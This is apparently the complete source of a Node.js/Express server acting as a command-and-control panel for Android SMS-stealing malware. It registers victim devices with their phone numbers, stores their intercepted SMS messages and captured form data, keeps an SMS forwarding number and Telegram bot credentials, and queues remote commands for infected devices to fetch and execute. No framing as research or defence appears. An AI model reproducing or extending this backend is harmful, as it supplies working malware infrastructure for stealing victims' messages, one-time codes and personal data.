const express = require('express');
const cors = require('cors');
const path = require('path');

let Database;
try {
  Database = require('better-sqlite3');
} catch (e) {
  console.error('better-sqlite3 not available. Install it or adapt to sqlite3.');
  throw e;
}

const app = express();
app.use(cors());
app.use(express.json());
app.set('trust proxy', true);

// Keep DB instance on global to survive warm invocations
if (!global.__C2H_DB) {
  const isVercel = !!process.env.VERCEL;
  const dbPath = isVercel ? '/tmp/c2h_panel.db' : path.join(__dirname, 'c2h_panel.db');

  const db = new Database(dbPath);
  db.exec(`
    CREATE TABLE IF NOT EXISTS devices (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT UNIQUE NOT NULL,
        device_name TEXT,
        os_version TEXT,
        phone_number TEXT,
        battery_level INTEGER,
        last_seen DATETIME NOT NULL,
        created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT NOT NULL,
        command_type TEXT NOT NULL,
        command_data TEXT NOT NULL,
        status TEXT NOT NULL DEFAULT 'pending',
        created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS sms_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT NOT NULL,
        sender TEXT NOT NULL,
        message_body TEXT NOT NULL,
        received_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS form_submissions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT NOT NULL,
        custom_data TEXT NOT NULL,
        submitted_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS global_settings (
        setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
        setting_value TEXT
    );
  `);

  global.__C2H_DB = db;
}
const db = global.__C2H_DB;

/* -------------------------
   API Routes
   ------------------------- */

// POST /api/device/register
app.post('/api/device/register', (req, res) => {
  try {
    const { device_id, device_name = null, os_version = null, battery_level = null, phone_number = null } = req.body;

    if (!device_id) return res.status(400).json({ status: 'error', message: 'device_id required' });

    const last_seen = new Date().toISOString();
    const existing = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(device_id);

    if (existing) {
      db.prepare(`UPDATE devices SET device_name = ?, os_version = ?, phone_number = ?, 
          battery_level = ?, last_seen = ? WHERE device_id = ?`)
        .run(device_name, os_version, phone_number, battery_level, last_seen, device_id);
    } else {
      db.prepare(`INSERT INTO devices (device_id, device_name, os_version, phone_number, 
          battery_level, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)`)
        .run(device_id, device_name, os_version, phone_number, battery_level, last_seen, last_seen);
    }

    return res.json({ status: 'success', message: 'Device data received and updated.' });
  } catch (err) {
    console.error('/api/device/register error:', err);
    return res.status(500).json({ status: 'error', message: err.message });
  }
});

// GET /api/devices
app.get('/api/devices', (req, res) => {
  try {
    const rows = db.prepare('SELECT * FROM devices ORDER BY created_at ASC').all();
    const currentTime = new Date();

    const devices = rows.map(device => {
      const lastSeen = new Date(device.last_seen);
      const timeDiff = (currentTime - lastSeen) / 1000;
      const is_online = timeDiff < 20;
      return {
        device_id: device.device_id,
        device_name: device.device_name,
        os_version: device.os_version,
        phone_number: device.phone_number,
        battery_level: device.battery_level,
        is_online,
        created_at: device.created_at
      };
    });

    return res.json(devices);
  } catch (err) {
    console.error('/api/devices error:', err);
    return res.status(500).json({ status: 'error', message: err.message });
  }
});

// POST /api/config/sms_forward
app.post('/api/config/sms_forward', (req, res) => {
  try {
    const { forward_number } = req.body;
    db.prepare(`INSERT OR REPLACE INTO global_settings (setting_key, setting_value) 
      VALUES ('sms_forward_number', ?)`).run(forward_number);
    return res.json({ status: 'success', message: 'Forwarding number updated successfully.' });
  } catch (err) {
    console.error('/api/config/sms_forward error:', err);
    return res.status(500).json({ status: 'error', message: err.message });
  }
});

// GET /api/config/sms_forward
app.get('/api/config/sms_forward', (req, res) => {
  try {
    const row = db.prepare('SELECT setting_value FROM global_settings WHERE setting_key = ?')
      .get('sms_forward_number');
    return res.json({ forward_number: row ? row.setting_value : null });
  } catch (err) {
    console.error('/api/config/sms_forward GET error:', err);
    return res.status(500).json({ status: 'error', message: err.message });
  }
});

// Telegram config POST/GET
app.post('/api/config/telegram', (req, res) => {
  try {
    const { telegram_bot_token = null, telegram_chat_id = null } = req.body;
    db.prepare(`INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES ('telegram_bot_token', ?)`)
      .run(telegram_bot_token);
    db.prepare(`INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES ('telegram_chat_id', ?)`)
      .run(telegram_chat_id);
    return res.json({ status: 'success', message: 'Telegram details updated successfully.' });
  } catch (err) {
    console.error('/api/config/telegram POST error:', err);
    return res.status(500).json({ status: 'error', message: err.message });
  }
});

app.get('/api/config/telegram', (req, res) => {
  try {
    const rows = db.prepare(`SELECT * FROM global_settings WHERE setting_key IN ('telegram_bot_token', 'telegram_chat_id')`).all();
    const result = {};
    rows.forEach(r => result[r.setting_key] = r.setting_value);
    return res.json({
      telegram_bot_token: result.telegram_bot_token || null,
      telegram_chat_id: result.telegram_chat_id || null
    });
  } catch (err) {
    console.error('/api/config/telegram GET error:', err);
    return res.status(500).json({ status: 'error', message: err.message });
  }
});

// Send command
app.post('/api/command/send', (req, res) => {
  try {
    const { device_id, command_type, command_data } = req.body;
    if (!device_id || !command_type || typeof command_data === 'undefined') {
      return res.status(400).json({ status: 'error', message: 'device_id, command_type, command_data required' });
    }
    db.prepare(`INSERT INTO commands (device_id, command_type, command_data, status) VALUES (?, ?, ?, 'pending')`)
      .run(device_id, command_type, JSON.stringify(command_data));
    return res.json({ status: 'success', message: 'Command queued successfully.' });
  } catch (err) {
    console.error('/api/command/send error:', err);
    return res.status(500).json({ status: 'error', message: err.message });
  }
});

// Get commands for device (only pending) and mark them sent
app.get('/api/device/:deviceId/commands', (req, res) => {
  try {
    const { deviceId } = req.params;
    const rows = db.prepare(`SELECT * FROM commands WHERE device_id = ? AND status = 'pending' ORDER BY created_at ASC`).all(deviceId);

    if (rows.length > 0) {
      const commandIds = rows.map(r => r.id);
      const placeholders = commandIds.map(() => '?').join(',');
      db.prepare(`UPDATE commands SET status = 'sent' WHERE id IN (${placeholders})`).run(...commandIds);
    }

    const commands = rows.map(cmd => ({
      id: cmd.id,
      command_type: cmd.command_type,
      command_data: cmd.command_data
    }));

    return res.json(commands);
  } catch (err) {
    console.error('/api/device/:deviceId/commands error:', err);
    return res.status(500).json({ status: 'error', message: err.message });
  }
});

// Execute command
app.post('/api/command/:commandId/execute', (req, res) => {
  try {
    const { commandId } = req.params;
    db.prepare(`UPDATE commands SET status = 'executed' WHERE id = ?`).run(commandId);
    return res.json({ status: 'success', message: 'Command marked as executed.' });
  } catch (err) {
    console.error('/api/command/:commandId/execute error:', err);
    return res.status(500).json({ status: 'error', message: err.message });
  }
});

// Forms
app.post('/api/device/:deviceId/forms', (req, res) => {
  try {
    const { deviceId } = req.params;
    const { custom_data } = req.body;
    db.prepare('INSERT INTO form_submissions (device_id, custom_data) VALUES (?, ?)').run(deviceId, custom_data);
    return res.json({ status: 'success', message: 'Form data saved.' });
  } catch (err) {
    console.error('/api/device/:deviceId/forms POST error:', err);
    return res.status(500).json({ status: 'error', message: err.message });
  }
});

app.get('/api/device/:deviceId/forms', (req, res) => {
  try {
    const { deviceId } = req.params;
    const rows = db.prepare('SELECT * FROM form_submissions WHERE device_id = ? ORDER BY submitted_at DESC').all(deviceId);
    return res.json(rows);
  } catch (err) {
    console.error('/api/device/:deviceId/forms GET error:', err);
    return res.status(500).json({ status: 'error', message: err.message });
  }
});

// SMS logs
app.post('/api/device/:deviceId/sms', (req, res) => {
  try {
    const { deviceId } = req.params;
    const { sender, message_body } = req.body;
    db.prepare('INSERT INTO sms_logs (device_id, sender, message_body) VALUES (?, ?, ?)').run(deviceId, sender, message_body);
    return res.json({ status: 'success', message: 'SMS logged.' });
  } catch (err) {
    console.error('/api/device/:deviceId/sms POST error:', err);
    return res.status(500).json({ status: 'error', message: err.message });
  }
});

app.get('/api/device/:deviceId/sms', (req, res) => {
  try {
    const { deviceId } = req.params;
    const rows = db.prepare('SELECT * FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC').all(deviceId);
    return res.json(rows);
  } catch (err) {
    console.error('/api/device/:deviceId/sms GET error:', err);
    return res.status(500).json({ status: 'error', message: err.message });
  }
});

// Delete device & related rows
app.delete('/api/device/:deviceId', (req, res) => {
  try {
    const { deviceId } = req.params;
    db.prepare('DELETE FROM devices WHERE device_id = ?').run(deviceId);
    db.prepare('DELETE FROM sms_logs WHERE device_id = ?').run(deviceId);
    db.prepare('DELETE FROM form_submissions WHERE device_id = ?').run(deviceId);
    db.prepare('DELETE FROM commands WHERE device_id = ?').run(deviceId);
    return res.json({ status: 'success', message: 'Device and related data deleted.' });
  } catch (err) {
    console.error('/api/device/:deviceId DELETE error:', err);
    return res.status(500).json({ status: 'error', message: err.message });
  }
});

app.delete('/api/sms/:smsId', (req, res) => {
  try {
    const { smsId } = req.params;
    db.prepare('DELETE FROM sms_logs WHERE id = ?').run(smsId);
    return res.json({ status: 'success', message: 'SMS deleted.' });
  } catch (err) {
    console.error('/api/sms/:smsId DELETE error:', err);
    return res.status(500).json({ status: 'error', message: err.message });
  }
});

// Health
app.get('/api/health', (req, res) => {
  return res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

/* -------------------------
   Export handler for Vercel / generic serverless
   ------------------------- */

module.exports = (req, res) => {
  app(req, res);
};

if (require.main === module) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
  });
}
